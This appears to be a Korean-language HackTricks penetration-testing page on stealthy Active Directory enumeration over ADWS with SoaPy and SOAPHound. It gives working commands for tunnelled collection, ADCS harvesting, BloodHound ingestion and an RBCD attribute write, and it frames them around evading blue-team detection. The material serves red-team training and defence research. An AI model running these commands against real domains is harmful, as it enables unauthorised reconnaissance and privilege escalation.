# Active Directory Web Services (ADWS) 열거 및 은밀 수집

{{#include ../../banners/hacktricks-training.md}}

## ADWS란?

Active Directory Web Services (ADWS)는 **Windows Server 2008 R2 이후 모든 Domain Controller에서 기본적으로 활성화되어 있으며** TCP **9389**를 리슨합니다. 이름과 달리, **HTTP는 전혀 관여하지 않습니다**. 대신 이 서비스는 LDAP 스타일 데이터를 독점적인 .NET 프레이밍 프로토콜 스택을 통해 노출합니다:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

트래픽이 이 바이너리 SOAP 프레임들 안에 캡슐화되고 흔치 않은 포트를 사용하기 때문에, **ADWS를 통한 열거는 전통적인 LDAP/389 & 636 트래픽보다 검사, 필터링, 시그니처 탐지의 대상이 될 가능성이 훨씬 낮습니다**. 운영자 관점에서 이는 다음을 의미합니다:

* 보다 은밀한 정찰 – Blue 팀은 종종 LDAP 쿼리에 집중합니다.
* SOCKS 프록시를 통해 9389/TCP를 터널링하면 **non-Windows 호스트(Linux, macOS)**에서도 수집 가능.
* LDAP을 통해 얻을 수 있는 동일한 데이터(사용자, 그룹, ACL, 스키마 등)와 **쓰기** 능력(예: **RBCD**용 `msDs-AllowedToActOnBehalfOfOtherIdentity`)을 가집니다.

ADWS 상호작용은 WS-Enumeration 위에서 구현됩니다: 모든 쿼리는 LDAP 필터/속성을 정의하는 `Enumerate` 메시지로 시작해 `EnumerationContext` GUID를 반환하고, 그 뒤에 서버가 정의한 결과 창까지 스트리밍하는 하나 이상의 `Pull` 메시지가 이어집니다. Context는 약 30분 후 만료되므로, 툴은 결과를 페이지화하거나 상태 손실을 피하기 위해 필터를 분할(예: CN별 접두사 쿼리)해야 합니다. 보안 기술자를 요청할 때는 SACL을 생략하려면 `LDAP_SERVER_SD_FLAGS_OID` 컨트롤을 지정해야 합니다. 그렇지 않으면 ADWS는 SOAP 응답에서 단순히 `nTSecurityDescriptor` 속성을 제거합니다.

> 참고: ADWS는 많은 RSAT GUI/PowerShell 도구에서도 사용되므로 트래픽이 합법적인 관리자 활동과 섞일 수 있습니다.

## SoaPy – 네이티브 Python 클라이언트

[SoaPy](https://github.com/logangoins/soapy)는 **pure Python으로 ADWS 프로토콜 스택을 완전 재구현한 구현체**입니다. NBFX/NBFSE/NNS/NMF 프레임을 바이트 단위로 생성하여 .NET 런타임에 손대지 않고 Unix 계열 시스템에서 수집할 수 있습니다.

### 주요 기능

* **SOCKS를 통한 프록시 지원** (C2 implants에서 유용).
* LDAP `-q '(objectClass=user)'`와 동일한 세분화된 검색 필터.
* 선택적 **쓰기** 작업( `--set` / `--delete` ).
* BloodHound로 직접 인제스트하기 위한 **BOFHound 출력 모드**.
* 사람이 읽기 좋게 만들기 위한 `--parse` 플래그(타임스탬프 / `userAccountControl` 정리).

### 대상 수집 플래그 및 쓰기 작업

SoaPy는 ADWS 위에서 가장 일반적인 LDAP 헌팅 작업을 재현하는 엄선된 스위치를 제공합니다: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds` 및 커스텀 풀을 위한 로우 `--query` / `--filter` 옵션. 이를 `--rbcd <source>`( `msDs-AllowedToActOnBehalfOfOtherIdentity` 설정), `--spn <service/cn>`(대상 Kerberoasting을 위한 SPN 스테이징), `--asrep`(`userAccountControl`에서 `DONT_REQ_PREAUTH` 플립) 같은 쓰기 프리미티브와 짝지어 사용하세요.

다음은 `samAccountName`과 `servicePrincipalName`만 반환하는 대상 SPN 검색 예시:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
같은 호스트/자격증명을 사용해 발견물을 즉시 weaponise하세요: `--rbcds`로 RBCD-capable objects를 dump한 다음 `--rbcd 'WEBSRV01$' --account 'FILE01$'`를 apply하여 Resource-Based Constrained Delegation chain을 stage하세요 (전체 악용 경로는 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) 참조).

### 설치 (운영자 호스트)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## SOAPHound – 대규모 ADWS 수집 (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound)는 .NET 수집기로, 모든 LDAP 상호작용을 ADWS 내부에 유지하고 BloodHound v4-compatible JSON을 출력합니다. 한 번 (`--buildcache`) `objectSid`, `objectGUID`, `distinguishedName` 및 `objectClass`의 전체 캐시를 생성한 다음, 이를 고용량 `--bhdump`, `--certdump` (ADCS), 또는 `--dnsdump` (AD-integrated DNS) 작업에 재사용하여 DC에서 나가는 속성은 약 35개의 핵심 속성으로만 제한됩니다. AutoSplit (`--autosplit --threshold <N>`)은 CN 접두사별로 쿼리를 자동으로 샤딩하여 큰 포리스트에서 30분 EnumerationContext 타임아웃을 넘지 않도록 합니다.

도메인에 조인된 operator VM에서의 일반적인 워크플로:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
내보낸 JSON은 SharpHound/BloodHound 워크플로우로 직접 넣을 수 있습니다—하류 그래프 아이디어는 [BloodHound methodology](bloodhound.md)를 참고하세요. AutoSplit은 SOAPHound를 수백만 객체 포리스트에서도 견고하게 만들며 ADExplorer-style 스냅샷보다 쿼리 수를 더 적게 유지합니다.

## 스텔스 AD 수집 워크플로우

다음 워크플로우는 ADWS를 통해 **도메인 & ADCS 객체**를 열거하고, 이를 BloodHound JSON으로 변환하여 인증서 기반 공격 경로를 탐색하는 방법을 보여줍니다 – 모두 Linux에서 수행됩니다:

1. **타겟 네트워크에서 자신의 머신으로 9389/TCP를 터널링** (예: Chisel, Meterpreter, SSH 동적 포트 포워딩 등). 환경 변수 `export HTTPS_PROXY=socks5://127.0.0.1:1080`를 설정하거나 SoaPy의 `--proxyHost/--proxyPort`를 사용하세요.

2. **루트 도메인 객체 수집:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NC에서 ADCS 관련 객체 수집:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound로 변환:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIP 파일 업로드**를 BloodHound GUI에서 수행하고 `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` 같은 cypher 쿼리를 실행하여 인증서 권한 상승 경로(ESC1, ESC8 등)를 확인합니다.

### 쓰기 `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
이것을 `s4u2proxy`/`Rubeus /getticket`와 결합하여 전체 **Resource-Based Constrained Delegation** 체인을 구성하세요 (자세한 내용은 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) 참조).

## 도구 요약

| 목적 | 도구 | 비고 |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Can be proxied through same SOCKS |

## 참조

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
